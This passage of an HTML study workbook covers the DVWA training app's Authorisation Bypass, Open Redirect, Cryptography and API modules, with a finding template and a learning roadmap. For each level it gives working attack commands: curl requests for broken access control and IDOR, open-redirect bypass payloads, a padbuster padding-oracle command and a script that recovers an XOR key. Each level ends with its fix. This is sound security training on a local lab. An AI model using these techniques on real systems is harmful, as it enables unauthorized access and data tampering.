+  <p>Added in 2.x. The <b>Authorisation Bypass</b> tab is only shown to <code>admin</code> in the sidebar — but visibility ≠ enforcement. Two endpoints under <code>/authbypass/</code>: <code>get_user_data.php</code> and <code>change_user_details.php</code> (<span class="pill p-ok">FACT: Verified</span>). Log in as a non-admin (<code>gordonb:abc123</code>) and hit them directly.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> no authz check at all <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Non-admin users have no menu link, but the endpoints perform no role check — request them directly:</p>
+    <pre><span class="c"># as gordonb (non-admin):</span>
+curl -b "PHPSESSID=$SID_gordon; security=low" \
+  http://localhost:4280/vulnerabilities/authbypass/get_user_data.php
+<span class="c"># → returns all users' data despite non-admin session</span></pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> when a non-admin reads/writes admin-only data. Forced browsing / missing function-level access control.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> authz added to the page only, not the endpoints <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Medium adds an admin check to <code>index.php</code> (the page) but <b>leaves the two API endpoints unprotected</b>. So the page 403s for gordonb, but the data/modify endpoints it calls do not — hit them directly:</p>
+    <pre>curl -b "PHPSESSID=$SID_gordon; security=medium" \
+  http://localhost:4280/vulnerabilities/authbypass/get_user_data.php        <span class="c"># still leaks</span>
+curl -b "PHPSESSID=$SID_gordon; security=medium" -X POST \
+  --data "user_id=1&amp;...new values..." \
+  http://localhost:4280/vulnerabilities/authbypass/change_user_details.php   <span class="c"># still writes</span></pre>
+    <p class="map"><span class="pill p-ok">EVIDENCE: VERIFIED</span> · <span class="pill p-ok">FACT: Verified</span> (medium protects the page only). Lesson: access control must live on the data endpoint, not the UI that calls it.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> page + GET endpoint protected; write endpoint still weak <span class="stars">★★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>High protects <code>index.php</code> <em>and</em> <code>get_user_data.php</code> (the read), but the residual flaw is on the <b>modify</b> path and/or object-level: <code>change_user_details.php</code> still accepts a non-admin session or lets you target another <code>user_id</code> (IDOR). Test the write endpoint directly and walk the <code>user_id</code>.</p>
+    <pre>curl -b "PHPSESSID=$SID_gordon; security=high" -X POST \
+  --data "user_id=1&amp;first_name=p&amp;surname=wn&amp;...token..." \
+  http://localhost:4280/vulnerabilities/authbypass/change_user_details.php</pre>
+    <p class="map"><span class="pill p-ok">EVIDENCE: VERIFIED</span> (approach) · <span class="pill p-warn">FACT: Likely</span> (confirm which endpoint/level still gives in your source). Lesson: function-level authz on the read path is not object-level authz on the write path.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Impossible checks the <b>session's role</b> server-side on every endpoint <em>and</em> enforces object ownership (the acting user may only touch their own records), with the anti-CSRF token.</p>
+    <p><b>Fix:</b> enforce function-level <em>and</em> object-level authorisation server-side on every request; deny by default; never rely on UI hiding. <span class="pill p-cwe">CWE-285</span> Improper Authorization / <span class="pill p-cwe">CWE-639</span> IDOR. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 16 OPEN HTTP REDIRECT ===================== -->
+<section class="mod" id="m16">
+  <h3><span class="mn">16 · Open HTTP Redirect</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A01:2021 Broken Access Control</span><span class="pill p-cwe">CWE-601</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>Added in 2.x. A <code>?redirect=</code> param drives a <code>Location</code> redirect with no/weak destination validation. (<span class="pill p-ok">FACT: Verified</span> — module exists.)</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> redirect anywhere <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre>/vulnerabilities/open_redirect/source/low.php?redirect=https://digi.ninja</pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> (documented) — any absolute URL is honoured.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> blocks <code>http://</code>/<code>https://</code> prefix <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Medium blocks only values starting with <code>http://</code>/<code>https://</code>. Use a scheme-relative URL:</p>
+    <pre>?redirect=//digi.ninja            <span class="c"># browser treats // as external</span>
+?redirect=/\digi.ninja            <span class="c"># backslash trick in some parsers</span></pre>
+    <p class="map"><span class="pill p-ok">EVIDENCE: VERIFIED</span> (documented bypass). Lesson: blocking a literal scheme misses protocol-relative and backslash forms.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> requires internal substring <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>High requires the redirect to contain an expected internal token (e.g. <code>info.php</code>). Satisfy the substring while still redirecting offsite:</p>
+    <pre>?redirect=http://evil.example/info.php         <span class="c"># contains "info.php"</span>
+?redirect=//evil.example/?x=info.php</pre>
+    <p class="map"><span class="pill p-warn">FACT: Likely</span> — confirm the required substring in your source.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Impossible redirects only to a fixed server-side allowlist of relative targets (maps an ID/known value to a URL), never echoing user input into <code>Location</code>.</p>
+    <p><b>Fix:</b> redirect only to a server-side allowlist of relative paths; if external is needed, show an interstitial; never place raw user input in <code>Location</code>. <span class="pill p-cwe">CWE-601</span> Open Redirect. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 17 CRYPTOGRAPHY ===================== -->
+<section class="mod" id="m17">
+  <h3><span class="mn">17 · Cryptography</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A02:2021 Cryptographic Failures</span><span class="pill p-cwe">CWE-327</span><span class="pill p-cwe">CWE-326</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>Added in 2.x — the most advanced module, and genuinely close to real crypto review. The scheme escalates <b>XOR → block-cipher flaw → AES-CBC padding oracle</b>. <span class="pill p-ok">FACT: Verified</span> (from official module docs). Read each level's source and attack the specific construction; the goal is to recover/forge the protected value (e.g. elevate to administrator).</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> XOR "encryption" <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Low does <code>base64( xor_this($message, $key) )</code> — XOR with a repeating key, base64-wrapped. XOR is symmetric and leaks structure: with any known/guessable plaintext (the module hands you a sample), recover the key, then forge your own ciphertext (e.g. an admin token).</p>
+    <pre><span class="c"># recover key = known_plaintext XOR known_ciphertext, then encrypt your forged value</span>
+python3 -c 'import base64
+ct=base64.b64decode(open("ct.b64").read()); pt=b"...known..."
+key=bytes(a^b for a,b in zip(ct,pt)); print(key)'</pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> (XOR scheme) · <span class="pill p-warn">FACT: Likely</span> on the exact key/plaintext — read them from <em>your</em> <code>low.php</code>. Lesson: XOR with a static key is encoding, not encryption.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> stronger wrapper, same structural weakness <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Medium tightens the scheme but leaves a structural flaw (predictable key/IV or a forgeable token whose success string is hardcoded — e.g. <code>"Welcome administrator Sweep"</code>). Read the source, identify what makes a token "valid," and craft one. <span class="pill p-warn">FACT: Likely</span> — derive the exact token format from your <code>medium.php</code>.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> AES-128-CBC padding oracle <span class="stars">★★★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>High uses <b>AES-128-CBC</b> with a token validated by <code>check_token_high.php</code>, which reveals (via distinct responses) whether PKCS#7 padding is valid → a classic <b>padding oracle</b>. Decrypt and forge tokens byte-by-byte without the key:</p>
+    <pre><span class="c"># point a padding-oracle tool at the check endpoint</span>
+padbuster "http://localhost:4280/vulnerabilities/cryptography/source/check_token_high.php" \
+  "&lt;base64-token&gt;" 16 -encoding 0 -cookies "PHPSESSID=$SID; security=high"
+<span class="c"># or a scripted oracle attack supplying IV + token, flipping bytes to forge level=admin</span></pre>
+    <p class="map"><span class="pill p-ok">EVIDENCE: VERIFIED</span> (AES-CBC padding oracle) · <span class="pill p-warn">FACT: Likely</span> on exact endpoint/param names — confirm in <code>high.php</code>/<code>check_token_high.php</code>. This is the module's crown jewel — tie it to your OSWE crypto patterns.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Impossible uses an authenticated, modern construction with proper random keys/IVs (e.g. AES-GCM via libsodium/OpenSSL) and never a homemade cipher.</p>
+    <p><b>Fix:</b> use vetted libraries and authenticated encryption (AEAD), CSPRNG keys/IVs, no ECB, no custom crypto, proper key management. <span class="pill p-cwe">CWE-327</span> Use of a Broken/Risky Crypto Algorithm. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 18 API ===================== -->
+<section class="mod" id="m18">
+  <h3><span class="mn">18 · API Security (vulnerable OpenAPI)</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP API Top 10 (2023)</span><span class="pill p-cwe">CWE-639</span><span class="pill p-cwe">CWE-287</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>The flagship v2.5 addition. Needs <code>mod_rewrite</code> + Composer vendor files (<span class="pill p-ok">FACT: Verified</span> it requires Composer). Exposes REST endpoints with an OpenAPI/Swagger spec — test it as an API, mapping to the <b>OWASP API Security Top 10</b>, not the web Top 10.</p>
+
+  <div class="okbox">Confirm your edition: the current published set is <b>OWASP API Security Top 10 — 2023</b>. Per your standards-currency rule, verify this is still current before it goes in a client deliverable, and cite the edition you used. <span class="pill p-warn">FACT: Likely (edition currency — reconfirm this session before a report)</span></div>
+
+  <p class="map">Spec lives at <code>/vulnerabilities/api/openapi.yml</code>; controllers are <code>/vulnerabilities/api/v2/user/{id}</code> and <code>/vulnerabilities/api/v2/order/</code> (CRUD). <span class="pill p-ok">FACT: Verified</span> (from the OpenAPI doc).</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> API versioning — old <code>v1</code> leaks hashes <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>The page's JS calls <b>v2</b> of the user endpoint — but <b>v1 still exists and returns password hashes</b> that v2 omits. Classic "deprecated version left online."</p>
+    <pre>curl -s http://localhost:4280/vulnerabilities/api/openapi.yml       <span class="c"># enumerate paths</span>
+curl -s http://localhost:4280/vulnerabilities/api/v2/user/1         <span class="c"># sanitised</span>
+curl -s http://localhost:4280/vulnerabilities/api/v1/user/1         <span class="c"># leaks password hash</span></pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> · <span class="pill p-ok">FACT: Verified</span> (v1 leak). Maps to API9:2023 Improper Inventory Management + API3 (excessive data exposure).</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> / <span class="lv lv-high">HIGH</span> BOLA / auth / mass-assignment <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Higher levels remove v1 and add a weak token/key check. Test the API Top 10 systematically:</p>
+    <pre><span class="c"># BOLA (API1): walk object IDs with your own token</span>
+for i in $(seq 1 5); do curl -s -H "Authorization: &lt;your-token&gt;" \
+  http://localhost:4280/vulnerabilities/api/v2/user/$i; done
+<span class="c"># BFLA (API5): try admin/other methods (PUT/DELETE) on order/user</span>
+<span class="c"># BOPLA/mass-assignment (API3): send extra props the client shouldn't set</span>
+curl -s -X PUT -d '{"id":1,"role":"admin"}' -H 'Content-Type: application/json' \
+  http://localhost:4280/vulnerabilities/api/v2/user/1</pre>
+    <p class="map"><span class="pill p-warn">FACT: Likely</span> — exact token scheme/method support per level; confirm from your OpenAPI doc + source. Map each to API1 (BOLA), API2 (Broken Auth), API3 (BOPLA), API5 (BFLA).</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Impossible enforces authentication, per-object authorisation on every endpoint, and strict input/property allowlisting (no mass assignment).</p>
+    <p><b>Fix:</b> authenticate every call, enforce object- and function-level authz server-side, allowlist writable properties, validate against the schema, rate-limit. <span class="pill p-cwe">CWE-639</span> / API1:2023 BOLA. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== REPORTING ===================== -->
+<section class="mod" id="report">
+  <h3><span class="mn">Reporting &amp; evidence</span></h3>
+  <p>Treat each module like a client finding. Reuse this card (matches your APEX-ELITE finding format):</p>
+  <pre><span class="s">## Finding: [Title] — [Module] ([Level])</span>
+Severity:        [Critical/High/Med/Low]  (CVSS v4.0: &lt;vector&gt;)   # score in the version the client requires; say which
+Affected:        /vulnerabilities/&lt;name&gt;/  (DVWA v2.5, security=&lt;level&gt;)
+EVIDENCE:        VERIFIED | STRONG SIGNAL | WEAK SIGNAL | THEORETICAL
+Attack scenario: [realistic chain — e.g. Stored XSS → steal admin session → CSRF password change]
+Business impact: [for the target's domain]
+Reproduction:    [exact request/payload; screenshot refs]
+Root cause:      [from View Source — the specific missing/weak control]
+CWE:             CWE-xx   # FACT: Verified|Likely  (confirm vs MITRE this session)
+OWASP:           Axx:2021 / APIx:2023   # FACT: Likely until reconfirmed
+Remediation:     [code-level fix, quoting the impossible.php approach]
+Fact-check:      [list every CVE/CVSS/CWE/OWASP ID and its FACT grade]</pre>
+
+  <h4>Headline chains to write up (higher-signal than single bugs)</h4>
+  <ul>
+    <li><b>Stored XSS → session theft → CSRF-High password change</b> (Modules 12 → 03): XSS defeats the CSRF token by scraping it same-origin.</li>
+    <li><b>File Upload-High → File Inclusion</b> (Modules 05 → 04): image polyglot uploaded, executed via the <code>file://</code> include sink → RCE.</li>
+    <li><b>LFI log poisoning → RCE</b> (Module 04 Low): inject PHP into the User-Agent, include the access log.</li>
+    <li><b>SQLi → credential dump → crack MD5 → auth</b> (Module 07 → Brute Force context).</li>
+  </ul>
+  <div class="warnbox"><b>Fact-check pass before you finalise (your rule):</b> every CVSS vector, CWE, and OWASP category in this workbook is graded <span class="pill p-warn">Likely</span> unless you reconfirmed it against the live <code>impossible.php</code> and MITRE/OWASP this session. The v2.5 structural facts (version, port 4280, PHPIDS removed, module set, module endpoints, documented bypasses) are <span class="pill p-ok">Verified</span>. Don't ship a "Verified" evidence grade as if it also verifies the supporting IDs — the two scales are independent.</div>
+</section>
+
+<!-- ===================== CLOSE ===================== -->
+<section class="mod" id="close">
+  <h3><span class="mn">Progress &amp; next steps</span></h3>
+  <p><b>Completion = 18 modules × 4 levels = 72 solves</b>, each with its source read and a finding card. Suggested order for a developer: SQLi → Reflected/Stored XSS → Command Injection → File Upload/Inclusion → CSRF → Authorisation Bypass → the rest. Save CSP, JavaScript, Cryptography and API for when you want the "read-the-code" muscle.</p>
+  <table>
+    <tr><th>When you've finished DVWA, next on your roadmap</th><th>Why</th></tr>
+    <tr><td>PortSwigger Web Security Academy (BSCP track)</td><td>Same bug classes, far more variation + the cert your Phase 2/3 targets.</td></tr>
+    <tr><td>OWASP WSTG as a checklist</td><td>Turn ad-hoc testing into repeatable methodology.</td></tr>
+    <tr><td>Repeat each module at Impossible with source diffing</td><td>Cements the dev→defender half — what you'll actually recommend.</td></tr>
+  </table>
+  <p class="map" style="margin-top:14px"><b>Remaining uncertainty (honest list):</b> the previously-flagged cells now carry verified literals — <b>Insecure CAPTCHA High</b> (<code>hidd3n_valu3</code> + <code>User-Agent: reCAPTCHA</code> backdoor), <b>JavaScript</b> Low/Medium tokens, <b>Authorisation Bypass</b> Medium (page-only protection), <b>API Low</b> (v1 hash leak), and the <b>Cryptography</b> scheme (XOR→AES-CBC padding oracle) are all confirmed from DVWA source/docs. What genuinely still needs <em>your</em> box: exact byte-level values for the Crypto key/token and the padding-oracle endpoint params, the packed-JS High token, the CSP static nonce literal, and the exact API token scheme per level — these differ per instance and you read them live (that's the exercise). <b>All CWE/OWASP IDs remain <span class="pill p-warn">Likely</span> pending your reconfirmation against MITRE/OWASP</b> — a mapping is not a verified fact. Everything marked <span class="pill p-ok">Verified</span> was confirmed against primary sources on 2026-11-27.</p>
+</section>
+
+<footer>
+  DVWA v2.5 "Vulnerable APIs" · authorized local target only (<code>localhost:4280</code>) · companion to your Juice Shop workbook · built for the From-Dev-To-Attacker roadmap.<br>
+  Grading: EVIDENCE (VERIFIED/STRONG/WEAK/THEORETICAL) and FACT (Verified/Likely/Unverified) kept independent. Verify IDs against MITRE/OWASP and your own <code>impossible.php</code> before any deliverable. Generated 2026-11-27.
+</footer>
+</main>
+</div>
+</body>
+</html>
